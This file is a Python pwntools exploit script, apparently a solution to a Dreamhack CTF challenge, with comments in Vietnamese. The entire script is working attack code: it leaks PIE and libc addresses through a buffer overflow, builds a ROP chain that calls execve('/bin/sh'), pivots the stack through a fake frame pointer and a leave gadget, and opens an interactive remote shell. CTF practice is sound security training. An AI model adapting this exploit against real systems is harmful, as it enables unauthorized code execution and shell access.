from pwn import *
context.binary = exe = ELF('./prob_patched')
libc = ELF('./libc.so.6')
p = remote("host8.dreamhack.games", 18141)
p.sendlineafter(b'>> ' , b'1')
p.sendafter(b'>> ' , b'A'*4096)
p.sendlineafter(b'>> ' , b'1')
p.recvuntil(b'A'*4096)
leak_bytes = p.recvline().strip()
leak_addr = u64(leak_bytes.ljust(8, b'\x00'))
pie_base = leak_addr - 0x2008
adr = pie_base + 0x4020
log.success(f"bss Address: {hex(adr)}")
p.sendlineafter(b'>> ' , b'1')
p.sendlineafter(b'>> ' , b'2')
p.sendlineafter(b': ' , b'48')

p.sendlineafter(b': ' , b'6')
p.recvuntil(b'after byte:') 
p.recvline()
libc_leak = p.recv(6)
libc_leak = libc_leak.ljust(8, b'\x00')
libc_leak = u64(libc_leak)
log.success(f"Leaked Libc Address: {hex(libc_leak)}")
libc_base = libc_leak - 0x620d0
libc.address = libc_base
rop = ROP(libc)

# Tìm chuỗi /bin/sh
bin_sh = next(libc.search(b'/bin/sh\x00'))

# Phép thuật của Pwntools: Tự động tìm tất cả gadget cần thiết
# và xếp ROP chain hoàn chỉnh cho hàm execve
rop.call(libc.sym['execve'], [bin_sh, 0, 0])
payload = b'A'*8 +  b'A' * 0x17 + rop.chain()

p.sendline(b'1')
p.sendlineafter(b'>> ' , payload)
p.sendlineafter(b'>> ', b'2')
leave_gadget = pie_base + 0x000000000000130a

fake_rbp = adr + 0x17
fake_rbp = p64(fake_rbp) + p64(leave_gadget)[:6]

p.sendlineafter(b': ' , b'40')

p.sendafter(b': ' , fake_rbp)


p.interactive()


